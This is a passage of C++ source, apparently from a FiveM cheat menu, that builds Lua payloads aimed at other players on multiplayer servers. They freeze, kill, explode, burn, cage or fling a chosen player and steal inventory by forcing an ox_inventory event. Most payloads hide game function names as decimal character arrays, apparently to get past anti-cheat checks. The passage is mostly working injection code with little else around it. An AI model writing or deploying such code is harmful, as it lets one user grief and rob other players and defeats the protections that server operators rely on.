                )lua";
            }
            else if (actionName == "Freeze Player") {
                code = R"lua(
                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local player = GetPlayerFromServerId(targetSid)
                    if player ~= -1 then
                        local ped = GetPlayerPed(player)
                        FreezeEntityPosition(ped, )lua" + std::string(state ? "true" : "false") + R"lua()
                    end
                )lua";
            }
            else if (actionName == "Attach Truck") {
                code = R"lua(
                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local player = GetPlayerFromServerId(targetSid)
                    if player ~= -1 then
                        local ped = GetPlayerPed(player)
                        local coords = GetEntityCoords(ped)
                        local model = "pounder2"
                        RequestModel(model)
                        while not HasModelLoaded(model) do Wait(0) end
                        local vehicle = CreateVehicle(GetHashKey(model), coords.x, coords.y, coords.z, 0.0, true, true)
                        if DoesEntityExist(vehicle) then
                            NetworkRegisterEntityAsNetworked(vehicle)
                            local netId = VehToNet(vehicle)
                            SetNetworkIdExistsOnAllMachines(netId, true)
                            SetNetworkIdCanMigrate(netId, true)
                            Wait(200)
                            AttachEntityToEntity(vehicle, ped, GetPedBoneIndex(ped, 0), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 0, true)
                        end
                        SetModelAsNoLongerNeeded(model)
                    end
                )lua";
            }
            else if (actionName == "Attach Object") {
                code = R"lua(
                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local player = GetPlayerFromServerId(targetSid)
                    if player ~= -1 then
                        local ped = GetPlayerPed(player)
                        local coords = GetEntityCoords(ped)
                        local models = {"prop_cs1_14b_traind", "prop_barrier_work05", "prop_dumpster_01a", "prop_roadcone02a"}
                        local model = models[math.random(1, #models)]
                        RequestModel(model)
                        while not HasModelLoaded(model) do Wait(0) end
                        local obj = CreateObject(GetHashKey(model), coords.x, coords.y, coords.z, true, true, false)
                        if DoesEntityExist(obj) then
                            NetworkRegisterEntityAsNetworked(obj)
                            local netId = ObjToNet(obj)
                            SetNetworkIdExistsOnAllMachines(netId, true)
                            SetNetworkIdCanMigrate(netId, true)
                            Wait(200)
                            AttachEntityToEntity(obj, ped, GetPedBoneIndex(ped, 0), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 0, true)
                        end
                        SetModelAsNoLongerNeeded(model)
                    end
                )lua";
            }
            else if (actionName == "Glitch Player") {
                code = R"lua(
                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local player = GetPlayerFromServerId(targetSid)
                    if player ~= -1 then
                        local ped = GetPlayerPed(player)
                        local coords = GetEntityCoords(ped)
                        local myPed = PlayerPedId()
                        for i = 1, 15 do
                            SetEntityCoords(myPed, coords.x, coords.y, coords.z + 0.5, false, false, false, false)
                            Wait(50)
                            AttachEntityToEntityPhysically(myPed, ped, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
                            Wait(50)
                            DetachEntity(myPed, true, true)
                            Wait(100)
                        end
                    end
                )lua";
            }
            else if (actionName == "Give Weapons") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local targetPlayer = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)
                    if targetPlayer and targetPlayer ~= -1 then
                        local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(targetPlayer)
                        if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                            local weapons = {
                                -- Pistols
                                0x1B06D571, 0xBFE256D4, 0x5EF9FEC4, 0x22D8FE39, 0x99AEEB3B, 0xBFD21232, 0x88374054, 0xD205520E, 0x83839C4, 0xDC4DB296, 0xC1B3C3D1, 0xCB96392F, 0x97EA20B8, 0x47757124, 0xAF3696A1, 0x2B5EF5EC, 0x917F6C8C, 0x57A4368C, 0x1BC4FDB9, 0x3656C8C1, 1171102963,
                                -- SMGs
                                0x2BE6766B, 0x78A97CD1, 0x13532244, 0xEFE7E2DF, 0xA3D4D34, 0xDB1AA450, 0xBD251F15, 0x14E5AF95,
                                -- Assault Rifles
                                0xBFEFFF6D, 0x394F415C, 0x83BF0278, 0xFAD1F1C9, 0xAF113F99, 0xC0A3098D, 0x969C3D67, 0x7F229F94, 0x84BD7B5D, 0x624FE830, 0x9D1F17E6, 0xC78D71B4, 0xD1D5F52B, 0x72B7B5F1,
                                -- LMGs
                                0x7FD62962, 0xDBBD7280, 0x9D74C243, 0x61012683,
                                -- Shotguns
                                0x1D073A89, 0x555AF99A, 0x7846A318, 0xE289C71F, 0x9D61E50F, 0x3AA5DC2A, 0xEF94E131, 0x12E82D3D, 0xA89CB99E, 0x05A96BA4,
                                -- Sniper Rifles
                                0x05FC3C11, 0x0C472FE2, 0xA914799, 0xC735A67A, 0x6A6C02E0, 0x6E7C8E2C,
                                -- Heavy Weapons
                                0xB12C4D61, 0x63AB0442, 0x42A958AD, 0xFE8E9A4C, 0xA3A3B903, 0x781FE4A, 0xB60D13F7, 0x9D6E0CCF, 0x476BF155, 0xDB2C4E1A, 0x3BF5575,
                                -- Throwables
                                0x5FBF9342, 0x943F1F8D, 0xFDB58A50, 0x24B0A310, 0xBAE7C398, 0xABCA1F3B, 0xA0F6B2DE, 0xABF1372A, 0xBA45E8D0, 0x7F5C4D55, 0x060C9C76, 0x34F5E957, 0xBA9C0B2A, 0x18414041,
                                -- Melee
                                0x9976FF8A, 0xDF8A0000, 0x9213D3C7, 0xF9A9C93D, 0xDD6FBD09, 0xCD87A8F9, 0x43A3F6A8, 0x84A9A1AD, 0x9548385F, 0x4E9E9643, 0x190B23F0, 0x9414F135, 0x8C32C4A7, 0x67591C31, 0xF9E1B2AB, 0x3806F1C8, 0xD814F0E4, 0xDD6FBD1B, 0x657A84BA, 0xDA7017E5,
                                -- Miscellaneous
                                0x5B3957CD, 0x1CF5FA48
                            }
                            for _, weapon in ipairs(weapons) do
                                _g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(targetPed, weapon, 250, false, false)
                            end
                        end
                    end
                )lua";
            }
            else if (actionName == "Ragdoll Player") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local targetPlayer = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)
                    if targetPlayer and targetPlayer ~= -1 then
                        local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(targetPlayer)
                        if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                            _g({83,101,116,80,101,100,84,111,82,97,103,100,111,108,108})(targetPed, 5000, 5000, 0, false, false, false)
                        end
                    end
                )lua";
            }
            else if (actionName == "Kick From Vehicle") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local targetPlayer = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)

                    if targetPlayer and targetPlayer ~= -1 then

                        local _citizen = _G[_d({67,105,116,105,122,101,110})]
                        _citizen[_d({67,114,101,97,116,101,84,104,114,101,97,100})](function()
                            local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(targetPlayer)
                            if targetPed and targetPed ~= 0 then
                                local vehicle = _g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(targetPed, false)
                                if vehicle ~= 0 then
                                    _citizen[_d({87,97,105,116})](100)
                                    _g({83,101,116,86,101,104,105,99,108,101,69,120,99,108,117,115,105,118,101,68,114,105,118,101,114,95,50})(vehicle, _g({80,108,97,121,101,114,80,101,100,73,100})(), 1)
                                    _g({83,101,116,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(_g({80,108,97,121,101,114,80,101,100,73,100})(), vehicle, -1)
                                    _citizen[_d({87,97,105,116})](100)
                                    _g({83,101,116,86,101,104,105,99,108,101,69,120,99,108,117,115,105,118,101,68,114,105,118,101,114,95,50})(vehicle, 0, 0)
                                end
                            end
                        end)
                    end
                )lua";
            }
            else if (actionName == "Ban Player") {
                code = R"lua(
                    local targetId = )lua" + std::to_string(serverId) + R"lua(

                    local targetServerId = tonumber(targetId)
                    local clientId = GetPlayerFromServerId(targetServerId)

                    if clientId ~= -1 then
                        local targetPed = GetPlayerPed(clientId)
                        if DoesEntityExist(targetPed) then
                            if IsPedInAnyVehicle(targetPed, false) then
                                return
                            end

                            local targetCoords = GetEntityCoords(targetPed)
                            
                            local function SafeWrap(setFunc)
                                return function(...)
                                    return setFunc(...)
                                end
                            end

                            local SafeThread = SafeWrap(CreateThread)
                            local SafeCVehicle = SafeWrap(CreateVehicle)

                            SafeThread(function()
                                local vehicleModel = GetHashKey("mule")

                                RequestModel(vehicleModel)
                                while not HasModelLoaded(vehicleModel) do
                                    Wait(10)
                                end

                                local veh = SafeCVehicle(vehicleModel, targetCoords.x, targetCoords.y + 3.0, targetCoords.z, 0.0, true, true, false)
                                if not DoesEntityExist(veh) then return end

                                SetEntityVisible(veh, false, false)
                                Wait(400)
                                SetEntityVisible(veh, false, false)
                                SetEntityCoords(veh, targetCoords.x, targetCoords.y, targetCoords.z + 2.0, true, true, true, true)

                                if DoesEntityExist(veh) then
                                    SetEntityVisible(veh, false, false)
                                    SetEntityAsMissionEntity(veh, true, true)
                                    SetEntityDynamic(veh)
                                    SetEntityCollision(veh, true, true)
                                    ActivatePhysics(veh)

                                    SafeThread(function()
                                        Wait(2000)
                                        if DoesEntityExist(veh) then
                                            NetworkRequestControlOfEntity(veh)
                                            ApplyForceToEntity(
                                                veh,
                                                1,
                                                150000.0,
                                                0.0,
                                                350000000.0,
                                                0.0,
                                                0.0,
                                                0.0,
                                                0,
                                                true,
                                                true,
                                                true,
                                                false,
                                                true
                                            )
                                            Wait(6000)
                                            if DoesEntityExist(veh) then
                                                DeleteEntity(veh)
                                            end
                                        end
                                    end)
                                end
                            end)
                        end
                    end
                )lua";
            }
            else if (actionName == "Kill Player") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local targetPlayerId = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)
                    if targetPlayerId and targetPlayerId ~= -1 then
                        local createThread = _g({67,114,101,97,116,101,84,104,114,101,97,100})
                        createThread(function()
                            _g({87,97,105,116})(0)
                            local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(targetPlayerId)
                            if targetPed and _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                                local targetCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                                local originCoords = vector3(targetCoords.x, targetCoords.y, targetCoords.z + 2.0)
                                _g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})(
                                    originCoords.x, originCoords.y, originCoords.z,
                                    targetCoords.x, targetCoords.y, targetCoords.z,
                                    500.0,
                                    true,
                                    _g({71,101,116,72,97,115,104,75,101,121})("VEHICLE_WEAPON_PLAYER_BULLET"),
                                    _g({80,108,97,121,101,114,80,101,100,73,100})(),
                                    true,
                                    false,
                                    -1.0
                                )
                            end
                        end)
                    end
                )lua";
            }
            else if (actionName == "Explode Player") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n, hash)
                        local name = _d(n)
                        return _ENV[name] or _G[name] or function(...) return Citizen.InvokeNative(hash or GetHashKey(name), ...) end
                    end

                    local _GetPlayerFromServerId = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100}, 0x344CA85D4A2743E5)
                    local _GetPlayerPed = _g({71,101,116,80,108,97,121,101,114,80,101,100}, 0x43DBED0170AEC239)
                    local _DoesEntityExist = _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116}, 0x72449E489A4CE00F)
                    local _GetEntityCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115}, 0x3FE3FBDD91D0E790)
                    local _RequestModel = _g({82,101,113,117,101,115,116,77,111,100,101,108}, 0x963D27A58DF86C11)
                    local _RequestWeaponAsset = _g({82,101,113,117,101,115,116,87,101,97,112,111,110,65,115,115,101,116}, 0x5443438F03596C5D)
                    local _HasModelLoaded = _g({72,97,115,77,111,100,101,108,76,111,97,100,101,100}, 0x98A4EB5D89A0C952)
                    local _HasWeaponAssetLoaded = _g({72,97,115,87,101,97,112,111,110,65,115,115,101,116,76,111,97,100,101,100}, 0x36585AE6640C1A6E)
                    local _CreatePed = _g({67,114,101,97,116,101,80,101,100}, 0xD49F9B09F8319177)
                    local _SetEntityInvincible = _g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101}, 0x38821C45DE6590EF)
                    local _FreezeEntityPosition = _g({70,114,101,101,122,101,69,110,116,105,116,121,80,111,115,105,116,105,111,110}, 0x428A3C376485C266)
                    local _SetEntityVisible = _g({83,101,116,69,110,116,105,116,121,86,105,115,105,98,108,101}, 0xEA1C610A04DB6B5B)
                    local _GiveWeaponToPed = _g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100}, 0xBF0FD6E56C96CAEF)
                    local _SetCurrentPedWeapon = _g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110}, 0xAD2739C20CC7B375)
                    local _TaskShootAtCoord = _g({84,97,115,107,83,104,111,111,116,65,116,67,111,111,114,100}, 0x860431500F9A38CE)
                    local _SetEntityAsMissionEntity = _g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,101,116,105,111,110,69,110,116,105,116,121}, 0xAD738C3085FE7CA4)
                    local _DeleteEntity = _g({68,101,108,101,116,101,69,110,116,105,116,121}, 0xAE3CBE590B5C92A4)

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local targetPlayer = _GetPlayerFromServerId(targetSid)
                    if targetPlayer and targetPlayer ~= -1 then
                        local targetPed = _GetPlayerPed(targetPlayer)
                        if _DoesEntityExist(targetPed) then
                            local coords = _GetEntityCoords(targetPed)
                            Citizen.CreateThread(function()
                                local m = _g({71,101,116,72,97,115,104,75,101,121})('mp_m_freemode_01')
                                local w = _g({71,101,116,72,97,115,104,75,101,121})('WEAPON_HOMINGLAUNCHER')
                                _RequestModel(m)
                                _RequestWeaponAsset(w, 31, 0)
                                while not _HasModelLoaded(m) or not _HasWeaponAssetLoaded(w) do
                                    Citizen.Wait(0)
                                end
                                local n = _CreatePed(4, m, coords.x, coords.y, coords.z, 0.0, true, false)
                                if _DoesEntityExist(n) then
                                    _SetEntityInvincible(n, true)
                                    _FreezeEntityPosition(n, true)
                                    _SetEntityVisible(n, false, false)
                                    _GiveWeaponToPed(n, w, 999, false, true)
                                    _SetCurrentPedWeapon(n, w, true)
                                    _TaskShootAtCoord(n, coords.x, coords.y, coords.z - 2.0, 5000, w)
                                    Citizen.SetTimeout(500, function()
                                        if _DoesEntityExist(n) then
                                            _SetEntityAsMissionEntity(n, true, true)
                                            _DeleteEntity(n)
                                        end
                                    end)
                                end
                            end)
                        end
                    end
                )lua";
            }
            else if (actionName == "Clone Player") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local targetPlayer = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)
                    if targetPlayer and targetPlayer ~= -1 then
                        local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(targetPlayer)
                        if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                            local model = _g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(targetPed)
                            Citizen.CreateThread(function()
                                _g({82,101,113,117,101,115,116,77,111,100,101,108})(model)
                                while not _g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(model) do Citizen.Wait(0) end
                                local coords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                                local clone = _g({67,114,101,97,116,101,80,101,100})(26, model, coords.x + 1.0, coords.y, coords.z, 0.0, true, true)
                                _g({83,101,116,80,101,100,67,108,111,110,101})(clone, targetPed)
                                _g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(model)
                            end)
                        end
                    end
                )lua";
            }
            else if (actionName == "Attack Clone Player") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local targetPlayer = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)
                    if targetPlayer and targetPlayer ~= -1 then
                        local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(targetPlayer)
                        if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                            local model = _g({71,101,116,72,97,115,104,75,101,121})("s_m_y_cop_01")
                            Citizen.CreateThread(function()
                                _g({82,101,113,117,101,115,116,77,111,100,101,108})(model)
                                while not _g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(model) do Citizen.Wait(0) end
                                local coords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                                local ped = _g({67,114,101,97,116,101,80,101,100})(4, model, coords.x + 2.0, coords.y + 2.0, coords.z, 0.0, true, true)
                                _g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(ped, _g({71,101,116,72,97,115,104,75,101,121})("WEAPON_COMBATPISTOL"), 250, false, true)
                                _g({84,97,115,107,67,111,109,98,97,116,80,101,100})(ped, targetPed, 0, 16)
                                _g({83,101,116,80,101,100,65,115,69,110,101,109,121})(ped, true)
                                _g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(model)
                            end)
                        end
                    end
                )lua";
            }
            else if (actionName == "Steal Inventory") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetID = )lua" + std::to_string(serverId) + R"lua(

                    local function GetPlayerFromServerId(serverId)
                        for _, player in ipairs(g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()) do
                            if g({71,101,116,80,108,97,121,101,114,80,101,100})(player) and g({71,101,116,80,108,97,121,101,114,80,101,100})(player) ~= 0 then
                                if g({71,101,116,80,108,97,121,101,114,80,101,100})(player) == g({71,101,116,80,108,97,121,101,114,80,101,100})(g({80,108,97,121,101,114,73,100})()) then
                                    -- Ignore local player if needed or keep it simple
                                end
                            end
                            if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(player) == serverId then
                                return player
                            end
                        end
                        return nil
                    end

                    if not _G.RobbingPlayer then
                        _G.RobbingPlayer = true
                        _G.RobberyTargetId = targetID
                        _G.RobberyOriginalCoords = nil
                        _G.RobberyTeleported = false

                        Citizen.CreateThread(function()
                            local clientId = GetPlayerFromServerId(targetID)
                            if not clientId then 
                                _G.RobbingPlayer = false
                                return 
                            end

                            local targetPed = g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId)
                            if not targetPed or not g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then 
                                _G.RobbingPlayer = false
                                return 
                            end

                            local myPed = g({80,108,97,121,101,114,80,101,100,73,100})()
                            local myCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(myPed)
                            local targetCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                            _G.RobberyOriginalCoords = myCoords

                            if #(myCoords - targetCoords) > 3.0 then
                                local angle = math.random() * 2 * math.pi
                                local xOffset = math.cos(angle) * 1.5
                                local yOffset = math.sin(angle) * 1.5
                                g({83,101,116,69,110,116,105,116,121,67,111,111,114,100,115,78,111,79,102,102,115,101,116})(myPed, targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z, false, false, false, false)
                                g({83,101,116,69,110,116,105,116,121,86,105,115,105,98,108,101})(myPed, false, 0)
                                _G.RobberyTeleported = true
                                g({87,97,105,116})(200)
                            end

                            local dict = "missminuteman_1ig_2"
                            g({82,101,113,117,101,115,116,65,110,105,109,68,105,99,116})(dict)
                            while not g({72,97,115,65,110,105,109,68,105,99,116,76,111,97,100,101,100})(dict) do g({87,97,105,116})(10) end
                            g({84,97,115,107,80,108,97,121,65,110,105,109})(targetPed, dict, "handsup_base", 8.0, -8.0, -1, 49, 0, false, false, false)

                            g({65,116,116,97,99,104,69,110,116,105,116,121,84,111,69,110,116,105,116,121})(myPed, targetPed, 11816, 0.0, 0.45, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)

                            local robDict = "mp_common"
                            g({82,101,113,117,101,115,116,65,110,105,109,68,105,99,116})(robDict)
                            while not g({72,97,115,65,110,105,109,68,105,99,116,76,111,97,100,101,100})(robDict) do g({87,97,105,116})(10) end
                            g({84,97,115,107,80,108,97,121,65,110,105,109})(myPed, robDict, "givetake1_a", 8.0, -8.0, -1, 0, 0, false, false, false)

                            g({87,97,105,116})(500)

                            g({84,114,105,103,103,101,114,69,118,101,110,116})('ox_inventory:openInventory', 'otherplayer', targetID)
                        end)

                        Citizen.CreateThread(function()
                            while _G.RobbingPlayer do
                                g({87,97,105,116})(100)
                                if _G.RobberyTargetId then
                                    g({84,114,105,103,103,101,114,69,118,101,110,116})('ox_inventory:openInventory', 'otherplayer', _G.RobberyTargetId)
                                end
                            end

                            local myPed = g({80,108,97,121,101,114,80,101,100,73,100})()
                            local clientId = GetPlayerFromServerId(targetID)
                            if clientId then
                                local targetPed = g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId)
                                if targetPed and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                                    g({67,108,101,97,114,80,101,100,84,97,115,107,115})(targetPed)
                                end
                            end

                            g({68,101,116,97,99,104,69,110,116,105,116,121})(myPed, true, false)
                            g({67,108,101,97,114,80,101,100,84,97,115,107,115})(myPed)

                            if _G.RobberyTeleported and _G.RobberyOriginalCoords then
                                g({83,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(myPed, _G.RobberyOriginalCoords.x, _G.RobberyOriginalCoords.y, _G.RobberyOriginalCoords.z, false, false, false, false)
                                g({87,97,105,116})(100)
                                g({83,101,116,69,110,116,105,116,121,86,105,115,105,98,108,101})(myPed, true, 0)
                            end

                            _G.RobberyTargetId = nil
                            _G.RobberyOriginalCoords = nil
                            _G.RobberyTeleported = false
                        end)
                    else
                        _G.RobbingPlayer = false
                    end
                )lua";
            }
            else if (actionName == "Freeze Player") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local enabled = )lua" + (state ? "true" : "false") + R"lua(
                    local targetPlayer = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)
                    if targetPlayer and targetPlayer ~= -1 then
                        local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(targetPlayer)
                        if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                            _g({70,114,101,101,122,101,69,110,116,105,116,121,80,111,115,105,116,105,111,110})(targetPed, enabled)
                        end
                    end
                )lua";
            }
            else if (actionName == "Bring Player") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local targetPlayer = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)
                    if targetPlayer and targetPlayer ~= -1 then
                        local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(targetPlayer)
                        local myPed = _g({80,108,97,121,101,114,80,101,100,73,100})()
                        if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) and _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(myPed) then
                            local myCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(myPed)
                            _g({83,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed, myCoords.x, myCoords.y, myCoords.z, false, false, false, false)
                        end
                    end
                )lua";
            }
            else if (actionName == "Cage Player") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local targetPlayer = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)
                    if targetPlayer and targetPlayer ~= -1 then
                        local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(targetPlayer)
                        if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                            local coords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                            local model = "prop_gold_cont_01"
                            _g({82,101,113,117,101,115,116,77,111,100,101,108})(model)
                            while not _g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(model) do _g({87,97,105,116})(0) end
                            local obj = _g({67,114,101,97,116,101,79,98,106,101,99,116,78,111,79,102,102,115,101,116})(model, coords.x, coords.y, coords.z - 1.0, true, true, false)
                            if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(obj) then
                                _g({78,101,116,119,111,114,107,82,101,103,105,115,116,101,114,69,110,116,105,116,121,65,115,78,101,116,119,111,114,107,101,100})(obj)
                                local netId = _g({79,98,106,84,111,78,101,116})(obj)
                                _g({83,101,116,78,101,116,119,111,114,107,73,100,69,120,105,115,116,115,79,110,65,108,108,77,97,99,104,105,110,101,115})(netId, true)
                                _g({83,101,116,78,101,116,119,111,114,107,73,100,67,97,110,77,105,103,114,97,116,101})(netId, true)
                                _g({80,108,97,99,101,79,98,106,101,99,116,79,110,71,114,111,117,110,100,80,114,111,112,101,114,108,121})(obj)
                                _g({70,114,101,101,122,101,69,110,116,105,116,121,80,111,115,105,116,105,111,110})(obj, true)
                            end
                            _g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(model)
                        end
                    end
                )lua";
            }
            else if (actionName == "Burn Player") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local targetPlayer = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)
                    if targetPlayer and targetPlayer ~= -1 then
                        local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(targetPlayer)
                        if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                            local coords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                            _g({83,116,97,114,116,69,110,116,105,116,121,70,105,114,101})(targetPed)
                            _g({65,100,100,69,120,112,108,111,115,105,111,110})(coords.x, coords.y, coords.z, 12, 0.1, true, false, 0.0)
                        end
                    end
                )lua";
            }
            else if (actionName == "Punch Player") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local targetPlayer = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)
                    if targetPlayer and targetPlayer ~= -1 then
                        local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(targetPlayer)
                        if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                            -- Request control of the target entity to apply physical forces cleanly
                            local netId = _g({80,101,100,84,111,78,101,116})(targetPed)
                            if _g({78,101,116,84,111,69,110,116,105,116,121})(netId) == targetPed then
                                _g({78,101,116,119,111,114,107,82,101,113,117,101,115,116,67,111,110,116,114,111,108,79,102,69,110,116,105,116,121})(targetPed)
                            end

                            -- Apply melee punch damage directly
